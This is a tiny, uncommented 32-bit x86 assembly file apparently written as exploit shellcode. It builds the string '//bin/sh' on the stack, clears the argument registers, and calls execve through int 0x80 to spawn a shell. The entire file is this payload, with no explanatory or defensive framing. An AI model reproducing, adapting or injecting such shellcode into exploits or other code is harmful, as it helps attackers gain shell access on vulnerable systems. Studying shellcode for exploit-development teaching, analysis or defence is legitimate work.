.global main
.type main, @function
main:
	xor %ecx, %ecx ;
	push %ecx;
	push %ecx;
	pop %edx ;
	push $0x68732f6e ;
	push $0x69622f2f ;
	push %esp ;
	pop %ebx ;
	push $0xb ;
	pop %eax; 
	int $0x80;
